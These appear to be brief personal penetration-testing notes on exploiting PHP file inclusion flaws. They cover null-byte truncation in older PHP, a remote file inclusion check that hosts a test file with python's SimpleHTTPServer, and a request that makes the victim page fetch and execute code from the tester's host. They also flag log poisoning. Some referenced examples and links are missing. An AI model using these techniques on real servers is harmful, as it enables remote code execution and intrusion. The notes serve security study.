Check parameters used to load information from/to other pages for this

  Will be different for Windows but a similar concept

PHP before 5.something (lost what specific version!) will terminate a given string if a null byte is encountered

RFI
With LFI there's also the possibility of RFI- this will allow us to execute desired code on the victim server too.
Create a test file and host it using python -m SimpleHTTPServer
  http://some-random-ass-ip/page.php?page=http://our-random-ass-ip:random-ass-port/test.php
If our file is returned to us, RFI is a thing and this gives us the ability of RCE: code will be executed by the victim server before being returned to us

There's also more here on different techniques to try to exploit a LFI vulnerability:

NOTE: Log poisoning is likely possible if log files are readable from the server
